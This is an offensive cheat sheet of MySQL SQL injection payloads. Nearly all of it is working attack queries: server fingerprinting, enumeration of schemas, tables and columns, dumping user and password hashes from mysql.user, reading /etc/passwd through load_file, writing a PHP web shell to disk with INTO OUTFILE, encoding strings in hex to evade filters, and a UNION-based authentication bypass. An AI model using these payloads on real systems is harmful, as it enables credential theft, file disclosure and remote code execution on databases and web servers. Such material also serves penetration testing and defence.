# SQL Injection - MySQL

## Exploiting

### 1) Common information
```
SELECT version()
SELECT @@version
SELECT user()
SELECT database()
```

### 2) Database name
```
SELECT schema_name FROM information_schema.schemata
SELECT schema_name FROM information_schema.schemata WHERE schema_name=database()
```

### 3) Table names
```
SELECT table_name FROM information_schema.tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
```

### 4) Column names
```
SELECT column_name FROM information_schema.columns
SELECT column_name FROM information_schema.columns WHERE table_name='user'
SELECT column_name FROM information_schema.columns WHERE table_name='user' AND table_schema='mysql'
```

### 5) Dump data
```
SELECT user,password FROM user
SELECT user,password FROM mysql.user
```

### 6) Reading files:
```
SELECT load_file('/etc/passwd')
```

### 7) Writing files:
```
SELECT '<?php system($_GET[0]);?>' INTO OUTFILE('/tmp/test.php')
SELECT '<?php system($_GET[0]);?>' INTO DUMP FILE('/tmp/test.php')
```

## Tricks

### 1) Strings:
```
SELECT user,password FROM mysql.user WHERE user='root'
SELECT user,password FROM mysql.user WHERE user=0x726f6f74
SELECT user,password FROM mysql.user WHERE user=char(0x72,0x6f,0x6f,0x74)
SELECT user,password FROM mysql.user WHERE user=char(114, 111, 111, 116)
```

### 2) Concat
```
SELECT concat(user, 0x3a, password) FROM mysql.user
SELECT concat(user, 58, password) FROM mysql.user
```

### 3) Substring
```
SELECT substring(user, 1, 1) FROM mysql.user
```

## Other

### 1) Bypass authentication
```
SELECT password FROM mysql.user WHERE user='root' AND 1=2 UNION SELECT 'test'
SELECT password FROM mysql.user WHERE user='root' AND 1=2 UNION SELECT md5('test')
SELECT password FROM mysql.user WHERE user='root' AND 1=2 UNION SELECT sha1('test')
```
